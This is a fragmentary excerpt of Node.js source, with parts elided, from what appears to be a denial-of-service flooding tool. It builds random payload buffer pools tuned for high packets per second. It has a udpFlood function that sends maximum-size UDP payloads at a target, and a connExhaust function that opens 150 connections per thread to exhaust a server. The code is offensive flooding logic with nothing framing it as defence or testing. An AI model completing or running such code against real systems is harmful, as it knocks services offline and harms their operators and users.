...
// ── PAYLOAD BUFFER POOLS (Prevents CPU meltdown during high PPS) ──
const POOL_SIZE = 15; // 15 is plenty for randomness and saves 70% RAM vs 50
const BUFFERS = {
    tiny: Array.from({ length: POOL_SIZE }, () => crypto.randomBytes(64)),       // 64B
    small: Array.from({ length: POOL_SIZE }, () => crypto.randomBytes(256)),      // 256B
    medium: Array.from({ length: POOL_SIZE }, () => crypto.randomBytes(1024)),    // 1KB
    large: Array.from({ length: POOL_SIZE }, () => crypto.randomBytes(4096)),     // 4KB
    udpMax: Array.from({ length: POOL_SIZE }, () => crypto.randomBytes(1472)),    // Max UDP
    nullBuf: Array.from({ length: POOL_SIZE }, () => Buffer.alloc(256, 0x00))     // Null
};
...
function udpFlood(target, duration) {
    return new Promise((resolve) => {
        ...
        function fire() {
            ...
            const payload = getPayload('udpMax'); // Max UDP payload without fragmentation
...
function connExhaust(target, duration) {
    return new Promise((resolve) => {
        ...
        // Bounded to 150 per thread to prevent RAM OOM
        for (let i = 0; i < 150; i++) openConn();
